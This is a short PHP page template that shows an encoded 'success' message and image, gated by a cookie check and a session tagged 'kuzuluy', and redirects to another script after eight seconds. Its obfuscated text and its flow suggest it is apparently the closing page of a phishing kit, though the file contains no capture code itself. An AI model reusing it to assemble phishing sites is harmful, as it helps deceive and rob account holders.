<?php
require __DIR__ . '/function.php';
require $api->language();

$page = "success";
$api->check_cookie();
$api->session("kuzuluy", true, $page);

require __DIR__ . '/system/page/header.php';

$html .= '
<img src="'.$api->image_encode("assets/img/success.png")['local'].'" width="90px" height="90px">
<p class="home-header">'.$api->text_encode($text['80']).'</p>
<hr>
<p class="home-content">'.$api->text_encode($text['81']).'</p>
<p class="home-content">'.$api->text_encode($text['82']).'</p>
<hr>
<p class="home-title">'.$api->text_encode($text['83']).'</p>
<ul style="padding-left: 40px;">
<li style="padding-bottom:8px;text-align:left;font-size:14px">'.$api->text_encode($text['84']).'</li>
</ul>
<p><img src="'.$api->image_encode("assets/img/loading.gif")['local'].'"></p>
<script>setTimeout("location.href = \'../script.php?success\'", 8000);</script>';

require __DIR__ . '/system/page/footer.php';
?>
